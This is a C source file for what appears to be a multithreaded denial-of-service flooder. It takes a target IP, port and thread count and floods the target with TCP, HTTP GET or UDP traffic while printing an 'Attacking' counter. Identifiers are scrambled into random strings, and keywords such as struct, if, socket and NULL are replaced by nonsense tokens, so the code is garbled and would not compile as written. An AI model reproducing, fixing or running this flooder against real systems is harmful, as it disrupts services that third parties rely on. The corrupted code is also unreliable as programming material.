#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#define lwesspfozvap 100
#define qfwrhaaedjlh 1024
#define fmuocvlerjlb 3
#define txwcdweiqmew 
"\033[32m"#define uwlcljbcmkto 
"\033[31m"#define qtdzqatkpvaa 
"\033[0m"typedef bjdujmrbeyuc{char *ydtfohhalvms;int hhvvetcztumm;int hiutquqtjsiy;char *dumtteifpwyt;}ThreadData;int osazhddanuny=0;void *kzrjxgejyiql(void *zjgfmlbcqemz){ThreadData *bcyhmclhfdmq=(ThreadData *)zjgfmlbcqemz;char nulnlcqgghua[qfwrhaaedjlh];int cmcgzwuholuj;bjdujmrbeyuc ghtllgauwmhcserver;while(1){cmcgzwuholuj=yrhofcafkuuy(AF_INET,SOCK_STREAM,0);yjnsbitqeqvf(cmcgzwuholuj==-1){perror("Could not create socket");sleep(1);continue;}server.sin_addr.s_addr=inet_addr(bcyhmclhfdmq->ydtfohhalvms);server.sin_family=AF_INET;server.sin_port=htons(bcyhmclhfdmq->hhvvetcztumm);yjnsbitqeqvf(connect(cmcgzwuholuj,(bjdujmrbeyuc jryenxfwrmiv*)&server,sizeof(server))<0){perror("Connect failed");close(cmcgzwuholuj);sleep(1);continue;}while(1){yjnsbitqeqvf(send(cmcgzwuholuj,nulnlcqgghua,qfwrhaaedjlh,0)<0){perror("Send failed");break;}osazhddanuny++;}close(cmcgzwuholuj);}return pvicnvxkmqxh;}void *oxkuxmscepqp(void *zjgfmlbcqemz){ThreadData *bcyhmclhfdmq=(ThreadData *)zjgfmlbcqemz;char noqpxyrddwjw[qfwrhaaedjlh];int cmcgzwuholuj;bjdujmrbeyuc ghtllgauwmhcserver;snprintf(noqpxyrddwjw,qfwrhaaedjlh,"GET / HTTP/1.1\r\nHost: %s\r\n\r\n",bcyhmclhfdmq->ydtfohhalvms);while(1){cmcgzwuholuj=yrhofcafkuuy(AF_INET,SOCK_STREAM,0);yjnsbitqeqvf(cmcgzwuholuj==-1){perror("Could not create socket");sleep(1);continue;}server.sin_addr.s_addr=inet_addr(bcyhmclhfdmq->ydtfohhalvms);server.sin_family=AF_INET;server.sin_port=htons(bcyhmclhfdmq->hhvvetcztumm);yjnsbitqeqvf(connect(cmcgzwuholuj,(bjdujmrbeyuc jryenxfwrmiv*)&server,sizeof(server))<0){perror("Connect failed");close(cmcgzwuholuj);sleep(1);continue;}while(1){yjnsbitqeqvf(send(cmcgzwuholuj,noqpxyrddwjw,strlen(noqpxyrddwjw),0)<0){perror("Send failed");break;}osazhddanuny++;}close(cmcgzwuholuj);}return pvicnvxkmqxh;}void *wjngtpnaozni(void *zjgfmlbcqemz){ThreadData *bcyhmclhfdmq=(ThreadData *)zjgfmlbcqemz;char nulnlcqgghua[qfwrhaaedjlh];int cmcgzwuholuj;bjdujmrbeyuc ghtllgauwmhcserver;int qwlnlwthponk=0;cmcgzwuholuj=yrhofcafkuuy(AF_INET,SOCK_DGRAM,0);yjnsbitqeqvf(cmcgzwuholuj==-1){perror("Could not create socket");return pvicnvxkmqxh;}server.sin_addr.s_addr=inet_addr(bcyhmclhfdmq->ydtfohhalvms);server.sin_family=AF_INET;server.sin_port=htons(bcyhmclhfdmq->hhvvetcztumm);while(1){yjnsbitqeqvf(sendto(cmcgzwuholuj,nulnlcqgghua,qfwrhaaedjlh,0,(bjdujmrbeyuc jryenxfwrmiv*)&server,sizeof(server))<0){perror("Sendto failed");qwlnlwthponk++;yjnsbitqeqvf(qwlnlwthponk>=fmuocvlerjlb){break;}sleep(1);}else {osazhddanuny++;qwlnlwthponk=0;}}close(cmcgzwuholuj);return pvicnvxkmqxh;}int main(int maqrjmznmutq,char *krmcqdaemwkv[]){yjnsbitqeqvf(maqrjmznmutq<5){printf("Usage: %s <target_ip> <target_port> <method> <threads>\n",krmcqdaemwkv[0]);printf("Methods: tcp, http, udp\n");return 1;}char *ydtfohhalvms=krmcqdaemwkv[1];int hhvvetcztumm=atoi(krmcqdaemwkv[2]);char *dumtteifpwyt=krmcqdaemwkv[3];int rwpynyexcapp=atoi(krmcqdaemwkv[4]);yjnsbitqeqvf(rwpynyexcapp>lwesspfozvap){printf("Too many threads, max is %d\n",lwesspfozvap);return 1;}pthread_t jtdogjlnnrbb[lwesspfozvap];ThreadData lvqwlxrjxzqb[lwesspfozvap];printf("Starting %s flood with %d threads to %s:%d\n",dumtteifpwyt,rwpynyexcapp,ydtfohhalvms,hhvvetcztumm);for(int kdpdonxtrsev=0;kdpdonxtrsev<rwpynyexcapp;kdpdonxtrsev++){lvqwlxrjxzqb[kdpdonxtrsev].ydtfohhalvms=ydtfohhalvms;lvqwlxrjxzqb[kdpdonxtrsev].hhvvetcztumm=hhvvetcztumm;lvqwlxrjxzqb[kdpdonxtrsev].hiutquqtjsiy=kdpdonxtrsev;lvqwlxrjxzqb[kdpdonxtrsev].dumtteifpwyt=dumtteifpwyt;yjnsbitqeqvf(strcmp(dumtteifpwyt,"tcp")==0){yjnsbitqeqvf(pthread_create(&jtdogjlnnrbb[kdpdonxtrsev],pvicnvxkmqxh,kzrjxgejyiql,(void *)&lvqwlxrjxzqb[kdpdonxtrsev])!=0){perror("Failed to create thread");return 1;}}else yjnsbitqeqvf (strcmp(dumtteifpwyt,"http")==0){yjnsbitqeqvf(pthread_create(&jtdogjlnnrbb[kdpdonxtrsev],pvicnvxkmqxh,oxkuxmscepqp,(void *)&lvqwlxrjxzqb[kdpdonxtrsev])!=0){perror("Failed to create thread");return 1;}}else yjnsbitqeqvf (strcmp(dumtteifpwyt,"udp")==0){yjnsbitqeqvf(pthread_create(&jtdogjlnnrbb[kdpdonxtrsev],pvicnvxkmqxh,wjngtpnaozni,(void *)&lvqwlxrjxzqb[kdpdonxtrsev])!=0){perror("Failed to create thread");return 1;}}else {printf("Unknown method: %s\n",dumtteifpwyt);return 1;}}while(1){printf("\r%sAttacking%s | [ %s%d%s ]",txwcdweiqmew,qtdzqatkpvaa,uwlcljbcmkto,osazhddanuny,qtdzqatkpvaa);fflush(stdout);sleep(1);}for(int kdpdonxtrsev=0;kdpdonxtrsev<rwpynyexcapp;kdpdonxtrsev++){pthread_join(jtdogjlnnrbb[kdpdonxtrsev],pvicnvxkmqxh);}return 0;}